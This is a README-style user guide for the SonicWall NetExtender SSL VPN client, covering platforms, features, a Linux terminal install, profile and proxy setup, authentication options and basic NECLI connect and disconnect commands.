# SonicWall NetExtender

NetExtender is a streamlined SSL VPN client developed for remote users requiring secure connectivity to their organization's internal infrastructure. It creates an encrypted tunnel that provides full network access — including file sharing, drive mapping, and seamless usage of enterprise tools — as if working on the local network.

* [Installation](#installation)
* [Compatible Platforms](#compatible-platforms)
* [Key Features](#key-features)
* [Setting Up NetExtender](#setting-up-netextender)
* [How to Use NetExtender](#how-to-use-netextender)
* [Security and Authentication](#security-and-authentication)
* [Command Line Interface (CLI) Usage](#command-line-interface-cli-usage)

## Installation

To begin, download the NetExtender client for Windows via the link below:

[**Download NetExtender**](*)

Start building a secure VPN connection by installing the client. This step is vital for setting up a reliable SSL-based VPN link to your corporate environment. After downloading, simply follow the installation prompts to get connected safely from nearly any location.

## Compatible Platforms

NetExtender is available for the following systems and devices:

### **Windows:**

* **Windows 10/11** (updated versions recommended)
* Works with **Microsoft Edge, Chrome, and Firefox**

### **Linux:**

* **Ubuntu 18.04 and newer**
* **Fedora 14 or later**
* **OpenSUSE 10.3+**
* Installation packages provided in `.rpm` and `.tgz` formats

### **SonicWall Device Support:**

NetExtender integrates effortlessly with **SonicWall SMA series** and **firewalls running SonicOS 6.5 or above**.

## Key Features

### 🔹 **Dedicated VPN Client**

NetExtender functions independently of your browser once it's been initially configured.

### 🔹 **Flexible Authentication Methods**

* **Standard username/password login**
* **OTP (One-Time Password) compatibility**
* **Support for RSA SecureID, Duo, and Microsoft Authenticator**

### 🔹 **Advanced Security Protocols**

* **SSL-encrypted VPN connections**
* **Operates in both Full Tunnel and Split Tunnel modes**

### 🔹 **Proxy Support**

Compatible with **HTTPS proxy setups** and auto-configurable via **WPAD** detection.

## Installing NetExtender

### Linux Setup via Terminal

1. **Fetch the correct archive file:**

   ```bash
   wget https://yoursonicwallserver.com/NetExtender.tgz
   ```
2. **Unpack and initiate installation:**

   ```bash
   tar -xvzf NetExtender.tgz
   cd netExtenderClient/
   sudo ./install
   ```
3. **Start the GUI interface:**

   ```bash
   netExtenderGui
   ```

> \[!warning] **Admin Access Required:**
> You must use `sudo` privileges to complete the setup.

## Setting Up NetExtender

### VPN Profile Creation

Save multiple connection profiles for faster, repeated access.

1. Launch **NetExtender** and go to **Connection Profiles**.
2. Click on **Add New Profile**.
3. Fill in the necessary connection parameters:

   * **Server Address:** `vpn.yourcompany.com`
   * **Login Credentials**
   * **Domain (if applicable)**
4. Select **Save** to store the profile.

> \[!info] **Tip:**
> Enable **auto-connect** for quicker startup access.

### Configuring Proxy Settings

1. Head to the **Settings** section within NetExtender.
2. Enable the **Proxy Support** option.
3. Select a connection method:

   * **Automatic detection via WPAD**
   * **Manual configuration** (input proxy server and port manually)

## How to Use NetExtender

### Initiating a VPN Connection

1. Open the **NetExtender** client.
2. Choose a saved profile or input manually:

   * **VPN Host Address**
   * **Login Credentials**
3. Click **Connect** to begin your secure session.
4. Once connected, you’ll be able to:

   * **Access shared drives**
   * **Run internal business apps**
   * **Transfer files over a secure channel**

### Disconnecting from VPN

To terminate the session, click **Disconnect** in the app or run this in the terminal:

```bash
NECLI disconnect
```

## Security and Authentication

### Authentication Options Supported

* **Standard login (username/password)**
* **One-Time Password (OTP)** for enhanced protection
* **Digital certificate verification**
* **Multi-factor authentication (MFA)** for comprehensive security

> \[!warning] **Recommended Practice:**
> Always activate **MFA** to minimize the risk of unauthorized access.

---

## Command Line Interface (CLI) Usage

NetExtender includes a **CLI tool (`NECLI`)** ideal for automation and advanced control.

### Frequently Used CLI Commands

#### Establish a VPN Connection

```bash
NECLI connect -s vpn.company.com -u username -p password -d domain
```

#### Check VPN Connection Status

```bash
NECLI showstatus
```

#### Disconnect from the VPN

```bash
NECLI disconnect
```

> \[!tip] **Automate Routine Tasks:**
> Use `batch scripts` to streamline VPN login sequences and network routing.
